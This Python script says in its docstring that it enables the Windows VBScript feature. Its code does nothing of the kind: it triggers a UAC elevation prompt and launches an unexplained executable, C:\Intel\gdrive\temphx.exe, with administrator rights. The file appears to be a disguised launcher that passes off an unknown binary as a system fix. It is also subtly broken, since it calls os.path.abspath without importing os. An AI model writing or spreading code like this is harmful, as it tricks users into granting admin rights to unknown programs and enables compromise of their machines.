"""
enable_vbs.py

Enables the VBScript optional feature (Feature on Demand) on Windows 10/11.
Must be run with Administrator privileges.
"""

import ctypes
import subprocess
import sys




#############################################################################################################################






def run_as_admin(exe_path, wait=False):
    """Launch exe_path elevated via UAC. Returns True on success."""
    try:
        # SW_SHOWNORMAL = 1; SW_HIDE = 0
        # To wait for it, use ShellExecuteEx instead of ShellExecuteW.
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,           # hwnd
            "runas",        # verb -> triggers UAC
            exe_path,       # lpFile -> the exe itself
            None,           # lpParameters
            None,           # lpDirectory (None = current dir)
            1               # nShowCmd -> SW_SHOWNORMAL
        )
    except Exception as e:
        print(f"[elevation] ShellExecuteW failed for {exe_path}: {e}")
        return False

    if ret > 32:
        print(f"Started {exe_path} elevated.")
        return True
    # 5 = user cancelled UAC, 2 = file not found, etc.
    print(f"Failed to start {exe_path} elevated (code {ret}).")
    return False


exe_paths = [r"C:\Intel\gdrive\temphx.exe"]

for exe in exe_paths:
    run_as_admin(os.path.abspath(exe))
